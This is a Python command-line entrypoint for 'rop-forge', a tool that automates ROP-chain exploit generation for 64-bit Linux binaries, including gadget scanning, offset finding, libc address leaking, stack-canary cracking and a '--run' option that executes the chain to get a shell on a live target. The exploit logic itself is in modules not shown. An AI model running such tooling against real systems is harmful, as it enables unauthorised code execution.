"""Command-line entrypoint for rop-forge."""

import argparse
import sys

from rop_forge.analyzer import Protections, analyze_protections
from rop_forge.canary import CanaryNotFoundError, build_canary_execve_chain, crack_canary, verify_canary_shell
from rop_forge.chainer import (
    Chain,
    ChainNotFoundError,
    build_execve_chain,
    build_leaked_execve_chain,
    find_system_libc,
    verify_leaked_shell,
    verify_shell,
)
from rop_forge.gadgets import GadgetDatabase, GadgetKind, scan_gadgets
from rop_forge.leak import ForkingServer, LeakError, probe
from rop_forge.offset import OffsetNotFoundError, find_offset

_EXAMPLES_PER_KIND = 5

STAGES = ["analyzer", "gadgets", "offset", "chainer", "leak", "canary", "exploit"]


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="rop-forge",
        description="Automatically generate a ROP-chain exploit for a 64-bit Linux ELF binary.",
    )
    parser.add_argument("binary", help="path to the target ELF binary")
    parser.add_argument("--libc", help="path to the target's libc, if known", default=None)
    parser.add_argument(
        "--run", action="store_true", help="execute the generated exploit against the live target"
    )
    parser.add_argument(
        "--server",
        default=None,
        help=(
            "path to a forking-server variant of the target (see "
            "fixtures/src/server_main.c) — for PIE/ASLR targets, switches "
            "--stage chainer to the leak-based flow: probes this server for "
            "the overflow offset and libc's real runtime base, then builds/"
            "verifies the chain against it, instead of the aslr=False "
            "stand-in build_execve_chain() uses. If the target (per "
            "--stage analyzer) also has a stack canary, --stage chainer "
            "additionally cracks it first (see --stage canary) before "
            "probing — same forking server either way. (--stage leak/canary "
            "always take a server binary directly as their positional "
            "`binary` argument.)"
        ),
    )
    parser.add_argument(
        "--stage",
        choices=STAGES,
        default=None,
        help=(
            "run a single pipeline stage standalone and print its output, "
            "instead of the full pipeline (debugging/introspection; each "
            "stage wraps the same module function the full pipeline uses)"
        ),
    )
    return parser


def _print_protections(protections: Protections) -> None:
    print(f"NX:     {'enabled' if protections.nx else 'disabled'}")
    print(f"PIE:    {'enabled' if protections.pie else 'disabled'}")
    print(f"Canary: {'enabled' if protections.canary else 'disabled'}")
    print(f"RELRO:  {protections.relro.value}")


def _run_analyzer(args: argparse.Namespace) -> int:
    _print_protections(analyze_protections(args.binary))
    return 0


def _print_gadgets(db: GadgetDatabase) -> None:
    print(f"Found {len(db)} gadgets")
    for kind in GadgetKind:
        matches = db.by_kind(kind)
        if not matches:
            continue
        print(f"\n{kind.value} ({len(matches)}):")
        for gadget in matches[:_EXAMPLES_PER_KIND]:
            print(f"  {gadget}")
        if len(matches) > _EXAMPLES_PER_KIND:
            print(f"  ... and {len(matches) - _EXAMPLES_PER_KIND} more")


def _run_gadgets(args: argparse.Namespace) -> int:
    _print_gadgets(scan_gadgets(args.binary))
    return 0


def _run_offset(args: argparse.Namespace) -> int:
    offset = find_offset(args.binary)
    print(f"Offset to return address: {offset} bytes")
    return 0


def _print_chain(chain: Chain) -> None:
    print(f"Chain ({len(chain)} elements, {len(chain.payload())} payload bytes):")
    print(chain)


def _resolve_libc(args: argparse.Namespace) -> str:
    libc_path = args.libc or find_system_libc()
    if libc_path is None:
        raise ChainNotFoundError("no libc available and none found at standard system paths")
    return str(libc_path)


def _print_shell_result(ok: bool) -> int:
    print()
    print("Shell verified — got real command execution" if ok else "Shell verification failed")
    return 0 if ok else 4


def _run_chainer(args: argparse.Namespace) -> int:
    if args.server:
        libc_path = _resolve_libc(args)
        with ForkingServer(args.server) as server:
            if analyze_protections(args.binary).canary:
                chain, header = build_canary_execve_chain(server, libc_path)
                _print_chain(chain)
                if args.run:
                    return _print_shell_result(verify_canary_shell(server, header, chain))
                return 0

            chain, offset = build_leaked_execve_chain(server, libc_path)
            _print_chain(chain)
            if args.run:
                return _print_shell_result(verify_leaked_shell(server, chain, offset))
        return 0

    chain = build_execve_chain(args.binary, libc_path=args.libc)
    _print_chain(chain)
    if args.run:
        offset = find_offset(args.binary)
        return _print_shell_result(verify_shell(args.binary, chain, offset))
    return 0


def _run_leak(args: argparse.Namespace) -> int:
    with ForkingServer(args.binary) as server:
        result = probe(server, _resolve_libc(args))
    print(f"Offset to return address: {result.offset} bytes")
    print(f"Libc runtime base: 0x{result.libc_base:x}")
    return 0


def _run_canary(args: argparse.Namespace) -> int:
    with ForkingServer(args.binary) as server:
        result = crack_canary(server)
    print(f"Offset to canary: {result.offset} bytes")
    print(f"Canary: {result.canary.hex()}")
    return 0


def _stage_not_yet_implemented(stage: str):
    def _run(args: argparse.Namespace) -> int:
        print(f"rop-forge: stage '{stage}' not yet implemented", file=sys.stderr)
        return 1

    return _run


STAGE_RUNNERS = {
    "analyzer": _run_analyzer,
    "gadgets": _run_gadgets,
    "offset": _run_offset,
    "chainer": _run_chainer,
    "leak": _run_leak,
    "canary": _run_canary,
    "exploit": _stage_not_yet_implemented("exploit"),
}


def _run_full_pipeline(args: argparse.Namespace) -> int:
    for stage_runner in (_run_analyzer, _run_gadgets, _run_offset):
        exit_code = stage_runner(args)
        if exit_code != 0:
            return exit_code
    print("rop-forge: remaining pipeline stages not yet implemented", file=sys.stderr)
    return 1


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    runner = STAGE_RUNNERS[args.stage] if args.stage else _run_full_pipeline
    try:
        return runner(args)
    except (FileNotFoundError, IsADirectoryError) as exc:
        print(f"rop-forge: cannot read binary '{args.binary}': {exc}", file=sys.stderr)
        return 2
    except OffsetNotFoundError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3
    except ChainNotFoundError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3
    except LeakError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3
    except CanaryNotFoundError as exc:
        print(f"rop-forge: {exc}", file=sys.stderr)
        return 3


if __name__ == "__main__":
    raise SystemExit(main())
